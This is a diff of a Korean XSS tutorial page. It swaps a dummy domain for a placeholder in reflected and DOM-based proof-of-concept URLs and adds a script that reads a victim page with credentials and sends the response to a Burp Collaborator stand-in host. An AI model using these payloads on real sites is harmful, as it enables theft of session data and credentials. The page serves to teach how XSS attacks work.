@@ -28,7 +28,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > Proof of Concept
 > {: .label .label-blue }
 > ``` 
-> https://donotexistwebsitedontclickit.com?url=<script>alert("XSS")</script> 
+> https://<website>?url=<script>alert("XSS")</script> 
 >```
 
 - Victim이 해당 URL을 클릭하면, 서버에서 해당 악성 스크립트를 Victim의 브라우저로 **"반사 (Reflect)"** 해서 보냅니다.
@@ -47,7 +47,7 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > Proof of Concept
 > {: .label .label-blue }
 > ``` 
-> https://donotexistwebsitedontclickit.com/#javascript:alert("XSS") 
+> https://<website>/#javascript:alert("XSS") 
 >```
 
 - URL의 매개변수 값 등을 조작해 스크립트를 실행시킵니다.
@@ -72,7 +72,30 @@ XSS의 공격은 크게 3가지 유형으로 나뉩니다.
 > {: .label .label-blue }
 > 쿠키를 팝업창에 띄우기
 > ``` 
-> https://donotexistwebsitedontclickit.com?url=<script>alert(document.cookie)</script> 
+> https://<website>?url=<script>alert(document.cookie)</script> 
+>```
+
+{: .important-title }
+> Proof of Concept
+> {: .label .label-blue }
+> 쿠키를 Burp Collaborator (Attacker 서버로 보낼때)
+> ``` 
+> https://<website>?url=[The script under] 
+>```
+> [The script under]:
+>```js
+> <script>
+>   var xhr = new XMLHttpRequest();
+>   var url = 'VICTIM URL'
+>   xhr.onreadystatechange = function() {
+>       if (xhr.readyState == XMLHttpRequest.DONE) {
+>           fetch('https://BURPCOLLABORATOR/' + xhr.responseText)
+>       }
+>   }
+>   xhr.open('GET', url, true);
+>   xhr.withCredentials = true;
+>   xhr.send(null);
+> </script>
 >```
 
 - Capture Password (로그인 크레덴셜 탈취)
